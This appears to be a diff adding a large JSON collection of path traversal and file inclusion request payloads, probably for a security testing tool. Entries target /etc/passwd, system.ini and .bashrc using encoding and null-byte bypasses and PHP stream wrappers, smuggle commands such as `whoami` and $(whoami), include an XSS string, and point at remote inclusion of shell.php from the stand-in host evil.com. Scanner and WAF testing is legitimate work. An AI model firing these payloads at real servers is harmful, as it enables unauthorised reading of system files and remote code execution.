@@ -1,3 +1,4 @@
+[
 {
     "name": "Directory Traversal to Access Sensitive Files",
     "description": "Access sensitive file outside web root",
@@ -9,4 +10,887 @@
     "parameters": {
         "file": "../../../../var/log/auth.log"
     }
+},
+{
+    "name": "Basic Path Traversal - Linux",
+    "description": "Basic directory traversal attack",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "filename": "../../../../etc/passwd"
+    }
+},
+{
+    "name": "Basic Path Traversal - Windows",
+    "description": "Basic directory traversal on Windows",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "..\\..\\..\\windows\\system.ini"
+    }
+},
+{
+    "name": "URL Encoded Traversal",
+    "description": "URL encoded path traversal",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "..%2F..%2F..%2Fetc%2Fpasswd"
+    }
+},
+{
+    "name": "Double URL Encoding",
+    "description": "Double URL encoded traversal",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "..%252F..%252F..%252Fetc%252Fpasswd"
+    }
+},
+{
+    "name": "UTF-8 Encoding Traversal",
+    "description": "UTF-8 encoded path traversal",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+    }
+},
+{
+    "name": "Unicode Encoding",
+    "description": "Unicode encoded traversal sequences",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "..%u2216..%u2216..%u2216etc%u2216passwd"
+    }
+},
+{
+    "name": "Null Byte Injection",
+    "description": "Null byte termination bypass",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd%00"
+    }
+},
+{
+    "name": "Null Byte with Extension",
+    "description": "Null byte with file extension",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd%00.jpg"
+    }
+},
+{
+    "name": "Double Slash Bypass",
+    "description": "Double slash bypass technique",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "....//....//....//etc/passwd"
+    }
+},
+{
+    "name": "Backslash Variant",
+    "description": "Mixed slash types",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "..\\..\\..\\etc/passwd"
+    }
+},
+{
+    "name": "Absolute Path Bypass",
+    "description": "Absolute path attempt",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "/etc/passwd"
+    }
+},
+{
+    "name": "Path with Trailing Slash",
+    "description": "Trailing slash variation",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd/"
+    }
+},
+{
+    "name": "Multiple Dot Variations",
+    "description": "Multiple dot variations",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "....//....//etc/passwd"
+    }
+},
+{
+    "name": "Encoded Null Byte",
+    "description": "URL encoded null byte",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd%2500"
+    }
+},
+{
+    "name": "Windows UNC Path",
+    "description": "Windows UNC path attack",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "\\\\127.0.0.1\\C$\\Windows\\System.ini"
+    }
+},
+{
+    "name": "Windows Drive Letter",
+    "description": "Windows drive letter access",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "C:\\Windows\\System.ini"
+    }
+},
+{
+    "name": "Encoded Backslash",
+    "description": "URL encoded backslash",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "..%5c..%5c..%5cwindows%5csystem.ini"
+    }
+},
+{
+    "name": "Double Encoded Backslash",
+    "description": "Double encoded backslash",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "..%255c..%255c..%255cwindows%255csystem.ini"
+    }
+},
+{
+    "name": "Mixed Encoding Types",
+    "description": "Mixed encoding techniques",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "..%2f..%5c..%2fetc%2fpasswd"
+    }
+},
+{
+    "name": "Path Truncation Attack",
+    "description": "Path truncation technique",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    }
+},
+{
+    "name": "Long Path with Null Byte",
+    "description": "Long path with null termination",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwdAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%00"
+    }
+},
+{
+    "name": "Case Sensitivity Bypass",
+    "description": "Case variation bypass",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../ETC/PASSWD"
+    }
+},
+{
+    "name": "Mixed Case Encoding",
+    "description": "Mixed case encoding",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "..%2F..%2f..%2Fetc%2fPASSWD"
+    }
+},
+{
+    "name": "Spaces in Path",
+    "description": "Paths with spaces",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../Program Files/file.txt"
+    }
+},
+{
+    "name": "URL Encoded Spaces",
+    "description": "URL encoded spaces",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../Program%20Files/file.txt"
+    }
+},
+{
+    "name": "Tab Character Injection",
+    "description": "Tab character bypass",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd\t"
+    }
+},
+{
+    "name": "Encoded Tab Character",
+    "description": "URL encoded tab",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd%09"
+    }
+},
+{
+    "name": "Newline Injection",
+    "description": "Newline character injection",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd\n"
+    }
+},
+{
+    "name": "Encoded Newline",
+    "description": "URL encoded newline",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd%0a"
+    }
+},
+{
+    "name": "Carriage Return Injection",
+    "description": "Carriage return injection",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd\r"
+    }
+},
+{
+    "name": "Encoded Carriage Return",
+    "description": "URL encoded carriage return",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd%0d"
+    }
+},
+{
+    "name": "Dot Dot Slash Variations",
+    "description": "Various dot dot slash combinations",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "....///....///etc/passwd"
+    }
+},
+{
+    "name": "Backslash Dot Variations",
+    "description": "Backslash dot combinations",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "..\\.\\..\\.\\..\\.\\etc\\passwd"
+    }
+},
+{
+    "name": "Mixed Slash Types",
+    "description": "Mixed forward and backslashes",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "..\\../..\\../etc/passwd"
+    }
+},
+{
+    "name": "URL Fragment Bypass",
+    "description": "URL fragment technique",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd#fragment"
+    }
+},
+{
+    "name": "Encoded Fragment",
+    "description": "URL encoded fragment",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd%23fragment"
+    }
+},
+{
+    "name": "Query String Bypass",
+    "description": "Query string technique",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd?param=value"
+    }
+},
+{
+    "name": "Encoded Query String",
+    "description": "URL encoded query string",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd%3Fparam%3Dvalue"
+    }
+},
+{
+    "name": "Multiple Parameter Attack",
+    "description": "Multiple parameter technique",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/",
+        "name": "passwd"
+    }
+},
+{
+    "name": "Parameter Pollution",
+    "description": "HTTP parameter pollution",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "normal.txt",
+        "file": "../../../../etc/passwd"
+    }
+},
+{
+    "name": "JSON Parameter Traversal",
+    "description": "JSON parameter attack",
+    "method": "POST",
+    "endpoint": "/api/file",
+    "headers": {
+        "Content-Type": "application/json"
+    },
+    "body": {
+        "filename": "../../../../etc/passwd"
+    }
+},
+{
+    "name": "XML Parameter Traversal",
+    "description": "XML parameter attack",
+    "method": "POST",
+    "endpoint": "/api/download",
+    "headers": {
+        "Content-Type": "application/xml"
+    },
+    "body": "<file>../../../../etc/passwd</file>"
+},
+{
+    "name": "Base64 Encoded Path",
+    "description": "Base64 encoded traversal",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA=="
+    }
+},
+{
+    "name": "Hex Encoded Path",
+    "description": "Hex encoded traversal",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "2e2e2f2e2e2f2e2e2f2e2e2f6574632f706173737764"
+    }
+},
+{
+    "name": "Unicode Point Encoding",
+    "description": "Unicode point encoding",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "..\\u002f..\\u002f..\\u002fetc\\u002fpasswd"
+    }
+},
+{
+    "name": "HTML Entity Encoding",
+    "description": "HTML entity encoding",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "..&#47;..&#47;..&#47;etc&#47;passwd"
+    }
+},
+{
+    "name": "Double HTML Encoding",
+    "description": "Double HTML encoding",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "..&amp;#47;..&amp;#47;..&amp;#47;etc&amp;#47;passwd"
+    }
+},
+{
+    "name": "UTF-7 Encoding",
+    "description": "UTF-7 encoding attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "+ADw-..+ADw-..+ADw-etc+ADw-passwd"
+    }
+},
+{
+    "name": "Windows Shortcut File",
+    "description": "Windows shortcut file attack",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../windows/system.ini.lnk"
+    }
+},
+{
+    "name": "Windows Alternate Data Stream",
+    "description": "Windows ADS attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../windows/system.ini:passwd.txt"
+    }
+},
+{
+    "name": "Zip Slip Attack",
+    "description": "Zip file path traversal",
+    "method": "POST",
+    "endpoint": "/upload",
+    "headers": {
+        "Content-Type": "multipart/form-data"
+    },
+    "parameters": {
+        "file": "../../../../etc/passwd"
+    }
+},
+{
+    "name": "Path with Special Characters",
+    "description": "Special characters in path",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/;passwd"
+    }
+},
+{
+    "name": "Encoded Special Characters",
+    "description": "URL encoded special chars",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/%3Bpasswd"
+    }
+},
+{
+    "name": "Backtick Injection",
+    "description": "Backtick command injection",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/`whoami`"
+    }
+},
+{
+    "name": "Dollar Expansion",
+    "description": "Dollar sign expansion",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/$(whoami)"
+    }
+},
+{
+    "name": "Environment Variable",
+    "description": "Environment variable expansion",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../$HOME/.bashrc"
+    }
+},
+{
+    "name": "Wildcard Expansion",
+    "description": "Wildcard character expansion",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/p*"
+    }
+},
+{
+    "name": "Multiple Wildcards",
+    "description": "Multiple wildcard characters",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/*swd"
+    }
+},
+{
+    "name": "Path with Parentheses",
+    "description": "Parentheses in path",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/(passwd)"
+    }
+},
+{
+    "name": "Encoded Parentheses",
+    "description": "URL encoded parentheses",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/%28passwd%29"
+    }
+},
+{
+    "name": "Brace Expansion",
+    "description": "Brace expansion attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/{pass,shadow}"
+    }
+},
+{
+    "name": "Multiple File Extensions",
+    "description": "Multiple file extensions",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd.txt.zip.rar"
+    }
+},
+{
+    "name": "No Extension Bypass",
+    "description": "No file extension",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd."
+    }
+},
+{
+    "name": "Double Extension",
+    "description": "Double file extension",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd.jpg.txt"
+    }
+},
+{
+    "name": "Reverse Double Extension",
+    "description": "Reverse double extension",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd.txt.jpg"
+    }
+},
+{
+    "name": "Case Variant Extension",
+    "description": "Case variant extension",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd.TXT"
+    }
+},
+{
+    "name": "Spaces in Extension",
+    "description": "Spaces in file extension",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd .txt"
+    }
+},
+{
+    "name": "Encoded Spaces in Extension",
+    "description": "URL encoded spaces in extension",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd%20.txt"
+    }
+},
+{
+    "name": "Tab in Extension",
+    "description": "Tab in file extension",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd\t.txt"
+    }
+},
+{
+    "name": "Encoded Tab in Extension",
+    "description": "URL encoded tab in extension",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd%09.txt"
+    }
+},
+{
+    "name": "Newline in Extension",
+    "description": "Newline in file extension",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "../../../../etc/passwd\n.txt"
+    }
+},
+{
+    "name": "Encoded Newline in Extension",
+    "description": "URL encoded newline in extension",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "../../../../etc/passwd%0a.txt"
+    }
+},
+{
+    "name": "Multiple Path Separators",
+    "description": "Multiple consecutive separators",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "..///..///..///etc///passwd"
+    }
+},
+{
+    "name": "Mixed Multiple Separators",
+    "description": "Mixed multiple separators",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "..\\\\..///..\\\\etc///passwd"
+    }
+},
+{
+    "name": "URL Authority Bypass",
+    "description": "URL authority component",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "//etc/passwd"
+    }
+},
+{
+    "name": "Full URL Bypass",
+    "description": "Full URL injection",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "file:///etc/passwd"
+    }
+},
+{
+    "name": "Encoded Full URL",
+    "description": "URL encoded full URL",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "file%3A%2F%2F%2Fetc%2Fpasswd"
+    }
+},
+{
+    "name": "Data URI Bypass",
+    "description": "Data URI scheme",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "data:text/plain;base64,../../../../etc/passwd"
+    }
+},
+{
+    "name": "Javascript Protocol",
+    "description": "Javascript protocol injection",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "javascript:alert('xss')"
+    }
+},
+{
+    "name": "VBscript Protocol",
+    "description": "VBscript protocol injection",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "vbscript:MsgBox('xss')"
+    }
+},
+{
+    "name": "PHP Wrapper",
+    "description": "PHP wrapper attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "php://filter/convert.base64-encode/resource=../../../../etc/passwd"
+    }
+},
+{
+    "name": "Expect Wrapper",
+    "description": "Expect wrapper attack",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "expect://whoami"
+    }
+},
+{
+    "name": "SSH Wrapper",
+    "description": "SSH wrapper attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "ssh2.shell://user:pass@example.com"
+    }
+},
+{
+    "name": "Zlib Wrapper",
+    "description": "Zlib wrapper attack",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "compress.zlib://../../../../etc/passwd"
+    }
+},
+{
+    "name": "Bzip2 Wrapper",
+    "description": "Bzip2 wrapper attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "compress.bzip2://../../../../etc/passwd"
+    }
+},
+{
+    "name": "RAR Wrapper",
+    "description": "RAR wrapper attack",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "rar://../../../../etc/passwd"
+    }
+},
+{
+    "name": "ZIP Wrapper",
+    "description": "ZIP wrapper attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "zip://../../../../etc/passwd"
+    }
+},
+{
+    "name": "Glob Wrapper",
+    "description": "Glob wrapper attack",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "glob://../../../../etc/p*"
+    }
+},
+{
+    "name": "PHAR Wrapper",
+    "description": "PHAR wrapper attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "phar://../../../../etc/passwd"
+    }
+},
+{
+    "name": "Iterable Wrapper",
+    "description": "Iterable wrapper attack",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "iterable://../../../../etc/passwd"
+    }
+},
+{
+    "name": "HTTP Wrapper",
+    "description": "HTTP wrapper attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "http://evil.com/shell.php"
+    }
+},
+{
+    "name": "HTTPS Wrapper",
+    "description": "HTTPS wrapper attack",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "https://evil.com/shell.php"
+    }
+},
+{
+    "name": "FTP Wrapper",
+    "description": "FTP wrapper attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "ftp://user:pass@evil.com/shell.php"
+    }
+},
+{
+    "name": "FTPS Wrapper",
+    "description": "FTPS wrapper attack",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "ftps://user:pass@evil.com/shell.php"
+    }
+},
+{
+    "name": "SFTP Wrapper",
+    "description": "SFTP wrapper attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "sftp://user:pass@evil.com/shell.php"
+    }
+},
+{
+    "name": "LDAP Wrapper",
+    "description": "LDAP wrapper attack",
+    "method": "GET",
+    "endpoint": "/file",
+    "parameters": {
+        "file": "ldap://evil.com/o=shell"
+    }
+},
+{
+    "name": "LDAPS Wrapper",
+    "description": "LDAPS wrapper attack",
+    "method": "GET",
+    "endpoint": "/download",
+    "parameters": {
+        "file": "ldaps://evil.com/o=shell"
+    }
 }
+]
